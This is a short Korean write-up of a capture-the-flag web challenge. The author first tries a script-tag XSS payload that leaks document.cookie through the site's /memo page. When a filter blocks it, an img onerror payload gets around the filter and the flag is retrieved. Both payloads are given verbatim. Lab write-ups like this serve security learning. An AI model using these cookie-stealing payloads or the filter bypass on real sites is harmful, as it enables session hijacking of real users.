<img src="https://velog.velcdn.com/images/silvergun8291/post/10c1f5f0-e466-44bb-af38-1e5017f05413/image.png">

문제 사이트에 접속하면 전과 같이 3개의 연결된 페이지 목록이 있습니다.


<br>


flag 페이지에 들어가서 동일하게 XSS 공격을 시도해보면

```html
<script>location.href = "/memo?memo=" + document.cookie;</script>
```

<img src="https://velog.velcdn.com/images/silvergun8291/post/6e618999-c2a7-43de-b2e0-d54ebf0230a3/image.png">

<img src="https://velog.velcdn.com/images/silvergun8291/post/5bf84483-234a-4361-b848-46efd4eddc84/image.png">

공격에 실패해서 FLAG가 출력되지 않았습니다.


<br>


XSS 필터링을 걸려있어서 우회를 해서 공격을 해야 할 거 같습니다.

onerror 이벤트 핸들러를 이용해서 우회 코드를 작성해보면

```html
<img src="valid.jpg" onerror="location.href = '/memo?memo=' + document.cookie">
```

없는 이미지는 로드하게 하여 데이터 로드를 실패하게 한 후 뒤에 코드가 실행되게 하였습니다.


<BR>


우회 코드로 다시 XSS 공격을 시도해보면

![](https://velog.velcdn.com/images/silvergun8291/post/e2744613-2c20-445a-acaf-93c58edb2b5a/image.png)

![](https://velog.velcdn.com/images/silvergun8291/post/a18332a5-fa83-4506-b2a9-779cc959072c/image.png)

이번에는 공격에 성공해서 FLAG가 출력되었습니다.





